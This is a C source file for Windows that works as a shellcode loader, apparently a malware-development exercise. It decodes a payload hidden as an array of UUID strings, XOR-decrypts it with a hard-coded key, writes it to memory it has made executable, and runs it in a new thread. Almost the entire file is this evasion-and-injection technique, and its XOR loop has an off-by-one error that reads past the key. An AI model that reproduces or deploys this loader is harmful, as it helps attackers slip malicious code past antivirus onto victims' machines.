#include <Windows.h>
#include <stdio.h>

#define NumberOfElements 17

char* UuidArray[] = {
        "394FF356-E81E-BB6A-CCDD-AF51EBEB9E8C", "699B48B8-95A9-5265-CAF3-478FF64821E9", "726595EC-F3FA-6AC3-A44A-E78A0595DFC0",
        "A1AD8706-2CEC-FA8A-0D14-E341AB7A2E30", "F3FB41BC-8F47-8BCE-E887-84DC3E8B2A33", "48EEDDCC-7B2F-BAB8-A601-7AEB4795F644",
        "94ECFB21-D0EF-ED49-8422-2741218F4495", "8AE7D6EF-9505-C0DF-06FA-0D14E341AB7A", "F19B3DF4-B8E6-F980-E645-936AB905B644",
        "94E8FB21-D0EF-FACC-47D1-A64421FBD094", "30EBD0EF-55C8-01A6-7AFA-949CB65EF3E1", "59AF858D-E1EB-5E84-0220-EBE9333DB641",
        "5684E1F3-E9FC-44FD-3322-B34810BACCDD", "BBAA00EE-95CC-8D63-ABBA-CCDDAFBA9B30", "D5115AA3-5B11-F7D1-E441-101D596073FF",
        "194FF37F-3CC6-C7AC-C65D-15E0DFBE779A", "D1C572FD-84CC-89AF-7044-19BE8F6CC9BB"
};


typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR        StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer = NULL,
        TmpBuffer = NULL;

    SIZE_T          sBuffSize = NULL;

    PCSTR           Terminator = NULL;

    NTSTATUS        STATUS = NULL;

    // Getting the UuidFromStringA function's base address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // Getting the size of the shellcode (number of elements * 16)
    sBuffSize = NmbrOfElements * 16;
    // Allocating memory that will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;


    // Loop through all the addresses saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {
        // UuidArray[i] is a single UUid address from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // Failed
            printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j > sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}


/*
API functions used to perform the injection part:

- VirtualAlloc: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

- VirtualProtect: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

- CreateThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
*/



int main() {

    PBYTE       pDeobfuscatedPayload = NULL;
    SIZE_T      sDeobfuscatedSize = NULL;

    // Prinitng some information
    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());

    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");

    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To XOR Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");
    XorFunction(pDeobfuscatedPayload, sDeobfuscatedSize, randomKey, sizeof(randomKey));
    printf("[+] DONE !\n");

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();
    // Allocating memory the size of sDeobfuscatedSize
    // With memory permissions set to read and write so that we can write the payload later
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }


    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

    DWORD dwOldProtection = NULL;
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    // Running the shellcode as a new thread's entry 
    HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);

    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    //Wait for infinite time until the thread executes the shellcode
    WaitForSingleObject(hThread, INFINITE);
    // Close the thread handle when you're done with it
    CloseHandle(hThread);
    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    // Freeing pShellcodeAddress
    VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);

    return 0;
}
